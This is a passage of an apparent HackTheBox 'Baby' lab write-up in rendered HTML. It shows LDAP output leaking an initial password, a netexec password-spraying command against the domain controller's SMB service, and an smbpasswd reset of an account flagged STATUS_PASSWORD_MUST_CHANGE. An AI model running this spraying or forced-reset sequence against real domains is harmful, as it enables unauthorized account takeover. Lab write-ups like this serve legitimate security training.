style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Set\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">initial\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">password\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">to\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BabyStart123!\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">15\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">LDAP\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">        \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">389\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Caroline.Robinson\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">             \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">2021-11-21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">15:14:37\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">2\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">16\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">~/HackTheBox/Medium/Baby/nmap\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">❯\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>We successfully enumerated some users on the DC and a potential credential \u003Ccode>Teresa.Bell:BabyStart123!\u003C/code> \u003C/p>\u003C/section>\u003Csection>\u003Ch2 id=\"password-spraying\">Password Spraying\u003Ca class=\"anchor\" href=\"#password-spraying\">\u003Cspan class=\"anchor-icon\" data-pagefind-ignore=\"\">#\u003C/span>\u003C/a>\u003C/h2>\u003Cp>As we found a bunch of users and password it is only natural to perform a \u003Cem>password spraying attack\u003C/em> on every user we found, let’s use \u003Ccode>netexec\u003C/code> again in order to do this, this time  we will target the \u003Cem>SMB\u003C/em> service\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:242ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">netexec\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">smb\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">babydc.baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-u\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">../content/users.txt\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-p\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">'BabyStart123!'\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">--users\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [*] Windows Server 2022 Build 20348 x64 (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">name:BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">domain:baby.vl\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">signing:True\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">) (\u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMBv1:False\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">)\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\G\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">uest:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\J\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">acqueline.Barnett:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">5\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\A\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">shley.Webb:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">6\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\H\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">ugh.George:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">7\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\L\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">eonard.Dyer:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">8\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\C\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">onnor.Wilkinson:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">9\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\J\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">oseph.Hughes:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">10\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\K\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">erry.Wilson:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">11\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\T\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">eresa.Bell:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_LOGON_FAILURE\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">12\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">         \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">10.129.50.21\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">445\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">    \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BABYDC\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">           [-] baby.vl\u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">\\C\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">aroline.Robinson:BabyStart123\u003C/span>\u003Cspan style=\"--0:#F97583;--1:#F97583\">!\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">STATUS_PASSWORD_MUST_CHANGE\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\">                                                                                                                   \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">4s\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z\">\u003C/path>\u003C/svg>\u003C/div>\u003C/button>\u003C/pre>\u003C/figure>\u003C/div>\u003Cp>And we see a different status on the \u003Ccode>Caroline.Robinson\u003C/code> account: \u003Ccode>STATUS_PASSWORD_MUST_CHANGE\u003C/code> \u003C/p>\u003Cp>We can abuse this using \u003Ccode>smbpasswd\u003C/code> , changing the targeted users password to a new password that we decide, in this case we will use \u003Ccode>BabyStarted123!\u003C/code> for example:\u003C/p>\u003Cdiv class=\"expressive-code\">\u003Cfigure class=\"frame is-terminal\">\u003Cfigcaption class=\"header\">\u003Cspan class=\"title\">\u003C/span>\u003Cspan class=\"sr-only\">Terminal window\u003C/span>\u003C/figcaption>\u003Cpre data-language=\"bash\" class=\"wrap\" style=\"--ecMaxLine:41ch\">\u003Ccode>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">1\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">smbpasswd\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-U\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">Caroline.Robinson\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#79B8FF;--1:#79B8FF\">-r\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> $TARGET\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">2\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Old\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">password:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BabyStart123!\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">3\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">New\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">password:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BabyStarted123!\u003C/span>\u003C/div>\u003C/div>\u003Cdiv class=\"ec-line\">\u003Cdiv class=\"gutter\">\u003Cdiv class=\"ln\" aria-hidden=\"true\">4\u003C/div>\u003C/div>\u003Cdiv class=\"code\">\u003Cspan style=\"--0:#B392F0;--1:#B392F0\">Retype\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">new\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">SMB\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">password:\u003C/span>\u003Cspan style=\"--0:#E1E4E8;--1:#E1E4E8\"> \u003C/span>\u003Cspan style=\"--0:#9ECBFF;--1:#9ECBFF\">BabyStarted123!\u003C/span>\u003C/div>\u003C/div>\u003C/code>\u003Cbutton class=\"copy-btn\" aria-label=\"Copy code\">\u003Cdiv class=\"copy-btn-icon\">\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon copy-icon\">\u003Cpath d=\"M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z\">\u003C/path>\u003C/svg>\u003Csvg viewBox=\"0 -960 960 960\" xmlns=\"http://www.w3.org/2000/svg\" class=\"copy-btn-icon success-icon\">\u003Cpath d=\"m389-377.13 